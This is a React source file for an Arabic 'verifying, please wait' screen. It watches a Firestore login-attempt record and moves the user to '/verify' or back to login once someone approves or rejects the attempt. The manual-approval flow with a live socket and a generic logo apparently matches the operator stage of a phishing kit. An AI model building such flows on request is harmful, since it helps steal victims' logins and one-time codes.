import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { doc, onSnapshot } from 'firebase/firestore';
import { db, isFirebaseInitialized } from '@/lib/firebase-config';
import { initSocket, disconnectSocket } from '@/lib/socket';

// Logo Component
const Logo = () => (
  <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-[70px] h-[70px]">
    <path d="M20 30 L50 10 L80 30 L50 50 Z" fill="#4c72b8"/>
    <path d="M20 70 L50 50 L80 70 L50 90 Z" fill="#2a9d8f"/>
  </svg>
);

// PowerLogo Component
const PowerLogo = () => (
  <svg viewBox="0 0 100 100" fill="none" stroke="#6c7a9c" strokeWidth="8" className="w-[30px] h-[30px]">
    <polygon points="50,10 90,30 90,70 50,90 10,70 10,30"/>
  </svg>
);

export default function WaitingPage() {
  const navigate = useNavigate();
  const [status, setStatus] = useState<'waiting' | 'approved' | 'rejected'>('waiting');

  // Socket.io connection
  useEffect(() => {
    initSocket('/waiting');
    
    return () => {
      disconnectSocket();
    };
  }, []);

  useEffect(() => {
    const attemptId = sessionStorage.getItem('login_attempt_id');
    
    if (!attemptId) {
      navigate('/');
      return;
    }

    // التحقق من حالة المحاولة باستخدام Firebase Firestore
    if (!isFirebaseInitialized() || !db) {
      // Firebase not initialized, just show waiting
      return;
    }

    const unsubscribe = onSnapshot(doc(db, 'loginAttempts', attemptId), (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data();
        
        if (data?.status === 'approved') {
          setStatus('approved');
          sessionStorage.removeItem('login_attempt_id');
          setTimeout(() => navigate('/verify'), 1500);
        } else if (data?.status === 'rejected') {
          setStatus('rejected');
          sessionStorage.removeItem('login_attempt_id');
          sessionStorage.setItem('login_rejected', 'true');
          
          if (data?.logoutNotice === true) {
            sessionStorage.setItem('logout_notice', 'true');
          }
          
          setTimeout(() => navigate('/'), 2000);
        }
      }
    });

    return () => {
      unsubscribe();
    };
  }, [navigate]);

  return (
    <div className="min-h-screen w-full bg-[#101935] flex flex-col justify-between p-5" dir="rtl">
      {/* Top Bar */}
      <div className="w-full flex justify-between items-center text-[#8d99ae] text-sm">
        <span>الإنكليزية</span>
        <i className="fa-solid fa-headset text-lg cursor-pointer"></i>
      </div>

      {/* Main Content - Centered */}
      <div className="w-full max-w-[380px] mx-auto my-0 flex flex-col items-center text-center">
        {/* Logo */}
        <div className="mb-6">
          <Logo />
        </div>

        {/* Status Content */}
        {status === 'waiting' && (
          <>
            {/* Spinner */}
            <div className="relative w-[80px] h-[80px] mb-6 flex justify-center items-center">
              <div className="w-[65px] h-[65px] border-4 border-[#1e2942] border-t-[#4c72b8] border-r-[#2a9d8f] rounded-full animate-spin"></div>
            </div>

            {/* Title */}
            <h1 className="text-xl font-bold mb-3 text-white flex items-center justify-center gap-1">
              جاري التحقق<span className="inline-block w-6 text-right">
                <span className="animate-pulse">.</span>
                <span className="animate-pulse delay-200">.</span>
                <span className="animate-pulse delay-400">.</span>
              </span>
            </h1>

            {/* Subtitle */}
            <p className="text-[#8d99ae] text-sm leading-relaxed">
              يرجى الانتظار وعدم إغلاق الصفحة لحين الانتهاء من المعالجة.
            </p>
          </>
        )}

        {status === 'approved' && (
          <>
            {/* Success Icon */}
            <div className="w-[80px] h-[80px] mb-6 flex justify-center items-center">
              <div className="w-[65px] h-[65px] bg-green-500/20 rounded-full flex justify-center items-center">
                <i className="fa-solid fa-check text-green-500 text-3xl"></i>
              </div>
            </div>

            {/* Title */}
            <h1 className="text-xl font-bold mb-3 text-green-500">
              تمت الموافقة
            </h1>

            {/* Subtitle */}
            <p className="text-[#8d99ae] text-sm leading-relaxed">
              جارٍ التحويل إلى صفحة التحقق...
            </p>
          </>
        )}

        {status === 'rejected' && (
          <>
            {/* Error Icon */}
            <div className="w-[80px] h-[80px] mb-6 flex justify-center items-center">
              <div className="w-[65px] h-[65px] bg-red-500/20 rounded-full flex justify-center items-center">
                <i className="fa-solid fa-times text-red-500 text-3xl"></i>
              </div>
            </div>

            {/* Title */}
            <h1 className="text-xl font-bold mb-3 text-red-500">
              تم الرفض
            </h1>

            {/* Subtitle */}
            <p className="text-[#8d99ae] text-sm leading-relaxed">
              جارٍ إعادتك إلى صفحة تسجيل الدخول...
            </p>
          </>
        )}
      </div>

      {/* Footer */}
      <div className="flex flex-col items-center text-[#6c7a9c] text-xs gap-1">
        <span>POWERED BY</span>
        <PowerLogo />
        <span>احدث اصدار</span>
      </div>
    </div>
  );
}
